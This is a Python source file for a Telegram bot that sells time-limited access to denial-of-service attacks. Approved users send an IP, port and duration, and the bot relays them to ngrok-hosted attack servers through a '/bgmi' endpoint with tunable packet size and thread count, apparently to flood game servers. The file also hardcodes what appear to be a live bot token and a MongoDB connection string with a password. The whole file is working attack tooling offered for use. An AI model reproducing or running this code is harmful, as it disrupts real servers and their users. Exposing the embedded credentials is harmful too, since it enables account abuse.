import os
import logging
import asyncio
import requests
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8043006224:AAFU4NBJ3RkPi3cOBMVEWTjAhMLv1Ald6IE'  # Replace with your actual Telegram bot token
ADMIN_USER_ID = 5926215327  # Replace with the actual admin user ID

# Cooldown dictionary and URL usage tracking
cooldown_dict = {}
ngrok_urls = [
    "https://61b1-16-171-42-61.ngrok-free.app",
    "https://d511-13-60-24-16.ngrok-free.app",
    "https://c531-13-61-21-61.ngrok-free.app"
]
url_usage_dict = {url: None for url in ngrok_urls}

# Valid IP prefixes
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Default packet size, thread, and duration
packet_size = 7
thread = 900
default_duration = 240

# MongoDB Configuration
MONGO_URI = "mongodb+srv://VIP:7OMbiO6JV74CFy0I@cluster0.rezah.mongodb.net/VipDatabase?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)
db = client['Dawood']
users_collection = db['users']
attacked_ips_collection = db['attacked_ips']

async def is_user_allowed(user_id):
    if user_id == ADMIN_USER_ID:
        return True
    
    user = users_collection.find_one({
        'user_id': user_id,
        'expiration_date': {'$gt': datetime.now()}
    })
    return user is not None

def approve_user(user_id, days):
    expiration_date = datetime.now() + timedelta(days=days)
    users_collection.update_one(
        {'user_id': user_id},
        {
            '$set': {
                'user_id': user_id,
                'expiration_date': expiration_date,
                'approved_at': datetime.now()
            }
        },
        upsert=True
    )

def remove_user(user_id):
    users_collection.delete_one({'user_id': user_id})

def write_attacked_ip(ip):
    attacked_ips_collection.insert_one({
        'ip': ip,
        'attacked_at': datetime.now()
    })

def is_ip_attacked(ip):
    return attacked_ips_collection.find_one({'ip': ip}) is not None

async def run_attack_command_async(target_ip, target_port, duration, user_id, packet_size, thread, context):
    for ngrok_url in ngrok_urls:
        if url_usage_dict[ngrok_url] is None or (datetime.now() - url_usage_dict[ngrok_url]).total_seconds() > duration:
            url_usage_dict[ngrok_url] = datetime.now()  # Mark this URL as in use
            try:
                url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packet_size={packet_size}&thread={thread}"
                headers = {"ngrok-skip-browser-warning": "any_value"}
                response = requests.get(url, headers=headers)

                if response.status_code == 200:
                    logging.info(f"Attack command sent successfully: {url}")
                    logging.info(f"Response: {response.json()}")
                    
                    # Wait for the attack duration
                    await asyncio.sleep(duration)
                    
                    # Send attack finished message
                    try:
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=(
                                f"*🎯 Attack Finished!*\n"
                                f"*Target:* `{target_ip}:{target_port}`\n"
                                f"*Duration:* `{duration}` seconds\n"
                                f"*Status:* Completed ✅"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logging.error(f"Failed to send attack finish message: {e}")
                else:
                    logging.error(f"Failed to send attack command. Status code: {response.status_code}")
                    logging.error(f"Response: {response.text}")
            except Exception as e:
                logging.error(f"Failed to execute command with {ngrok_url}: {e}")
            finally:
                url_usage_dict[ngrok_url] = None  # Mark this URL as free
            return

    # If no URLs are available
    logging.error("All ngrok URLs are currently busy. Please try again later.")

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    logging.info(f'Received /start command in chat {chat_id}')
    
    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return
    
    # Send initial information message
    await context.bot.send_message(chat_id=chat_id, text=(
        "Welcome! You can launch attacks with this bot.\n"
        "You can choose between default time (240 seconds) or customizable time.\n"
        "Use the buttons below to select your preferred option.\n"
        "If you select the wrong option, use /time to change it."
    ), parse_mode='Markdown')

    # Send inline buttons
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)

async def button(update: Update, context: CallbackContext):
    query = update.callback_query
    chat_id = query.message.chat.id
    user_id = query.from_user.id

    await query.answer()

    if query.data == 'default_time':
        context.user_data['time_mode'] = 'default'
        await context.bot.send_message(chat_id=chat_id, text=(
            "You have selected *Default Time*.\n"
            "Use /attack <ip> <port> to launch an attack with default settings."
        ), parse_mode='Markdown')
    elif query.data == 'custom_time':
        context.user_data['time_mode'] = 'custom'
        await context.bot.send_message(chat_id=chat_id, text=(
            "You have selected *Customizable Time*.\n"
            "Use /attack <ip> <port> <duration> to launch an attack with custom duration."
        ), parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /attack command from user {user_id} in chat {chat_id}')

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    time_mode = context.user_data.get('time_mode', 'default')

    if time_mode == 'default':
        if len(args) != 2:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port>*", parse_mode='Markdown')
            return
        target_ip, target_port = args[0], int(args[1])
        duration = default_duration
    else:
        if len(args) != 3:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

    # Check if the port is blocked
    if target_port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
        return

    # Check if the IP is valid
    if not target_ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return

    # Check if the IP has already been attacked
    if is_ip_attacked(target_ip):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This IP address has already been attacked!*", parse_mode='Markdown')
        return

    # Restrict maximum attack duration
    if duration > 240:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum attack duration is 240 seconds!*", parse_mode='Markdown')
        duration = 240

    # Cooldown period in seconds
    cooldown_period = 60
    current_time = datetime.now()

    # Check cooldown
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ You need to wait {remaining_time} seconds before launching another attack!*",
                parse_mode='Markdown'
            )
            return

    # Update the last attack time
    cooldown_dict[user_id] = current_time

    # Send attack initiation message
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {target_ip}:{target_port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ),
        parse_mode='Markdown'
    )

    # Launch the attack
    asyncio.create_task(run_attack_command_async(target_ip, target_port, duration, user_id, packet_size, thread, context))

    # Save the attacked IP
    write_attacked_ip(target_ip)

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /approve command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can approve users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <days>*", parse_mode='Markdown')
        return

    approve_user_id = int(args[0])
    days = int(args[1])

    approve_user(approve_user_id, days)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {approve_user_id} approved for {days} days!*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /remove command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can remove users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    remove_user_id = int(args[0])

    remove_user(remove_user_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {remove_user_id} has been removed!*", parse_mode='Markdown')

async def show(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*Current Configuration:*\n"
            f"*📦 Packet Size: {packet_size}*\n"
            f"*🧵 Thread: {thread}*\n"
            f"*⏳ Default Duration: {default_duration} seconds*\n"
        ),
        parse_mode='Markdown'
    )

async def set_packet_size(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'packet_size'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new packet size:*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'thread'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new thread count:*", parse_mode='Markdown')

async def handle_setting(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if 'setting' not in context.user_data:
        return

    setting = context.user_data['setting']
    value = update.message.text

    global packet_size, thread

    if setting == 'packet_size':
        packet_size = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Packet size updated to {packet_size}*", parse_mode='Markdown')
    elif setting == 'thread':
        thread = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Thread count updated to {thread}*", parse_mode='Markdown')

    del context.user_data['setting']

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id == ADMIN_USER_ID:
        help_text = (
            "*Admin Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack\n"
            "/approve <user_id> <days> - Approve a user for a specified number of days\n"
            "/remove <user_id> - Remove a user\n"
            "/show - Show the current packet size and thread\n"
            "/set - Set the packet size and thread\n"
            "/help - Show this help message\n"
        )
    else:
        help_text = (
            "*User Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack (if authorized)\n"
            "/help - Show this help message\n"
        )

    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown')

async def time_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Send initial information message
    await context.bot.send_message(chat_id=chat_id, text=(
        "You can choose between default time (240 seconds) or customizable time.\n"
        "Use the buttons below to select your preferred option.\n"
        "If you select the wrong option, use /time to change it."
    ), parse_mode='Markdown')

    # Send inline buttons
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)

def main():
    logging.info('Starting the bot...')
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("show", show))
    application.add_handler(CommandHandler("set", set_packet_size))
    application.add_handler(CommandHandler("set", set_thread))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("time", time_command))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_setting))
    application.run_polling()

if __name__ == '__main__':
    main()